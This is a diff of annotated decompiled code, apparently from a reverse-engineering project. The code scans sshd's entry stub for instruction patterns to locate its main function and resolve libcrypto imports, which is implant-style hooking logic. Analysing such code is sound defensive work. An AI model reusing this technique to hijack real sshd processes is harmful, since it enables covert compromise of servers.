@@ -83,7 +83,7 @@ BOOL sshd_find_main_from_entry_stub
         }
         else {
           // AutoDoc: Treat RIP-relative MOV/LEA instructions that resolve inside sshd's code segment as the prospective `sshd_main` pointer.
-          if (*(u32 *)&insn_ctx.opcode_window[3] == 0x10d) {
+          if (insn_ctx.opcode_window_dword == 0x10d) {
             if (((((insn_ctx.prefix.modrm_bytes.rex_byte & 0x48) == 0x48) &&
                  ((uint)insn_ctx.prefix.decoded.modrm >> 8 == 0x50700)) &&
                 (mov_target = insn_ctx.instruction + insn_ctx.mem_disp + insn_ctx.instruction_size,
@@ -92,11 +92,11 @@ BOOL sshd_find_main_from_entry_stub
             }
           }
           // AutoDoc: The capture is only valid when the very next CALL targets `__libc_start_main@GOT` via the same register.
-          else if (((sshd_main_candidate != (u8 *)0x0) && (*(u32 *)&insn_ctx.opcode_window[3] == 0x17f)) &&
-                  (((uint)insn_ctx.prefix.decoded.modrm >> 8 == 0x50200 &&
-                   (((insn_ctx.prefix.decoded.flags2 & 1) != 0 &&
-                    (libc_start_main_got == insn_ctx.instruction + insn_ctx.instruction_size + insn_ctx.mem_disp)
-                    ))))) {
+          else if (((sshd_main_candidate != (u8 *)0x0) && (insn_ctx.opcode_window_dword == 0x17f))
+                  && (((uint)insn_ctx.prefix.decoded.modrm >> 8 == 0x50200 &&
+                      (((insn_ctx.prefix.decoded.flags2 & 1) != 0 &&
+                       (libc_start_main_got == insn_ctx.instruction +
+                                  insn_ctx.instruction_size + insn_ctx.mem_disp)))))) {
             symbol_entry = elf_gnu_hash_lookup_symbol(libcrypto,STR_EVP_sha256,0);
             if (symbol_entry != (Elf64_Sym *)0x0) {
               imported_funcs->EVP_sha256 =
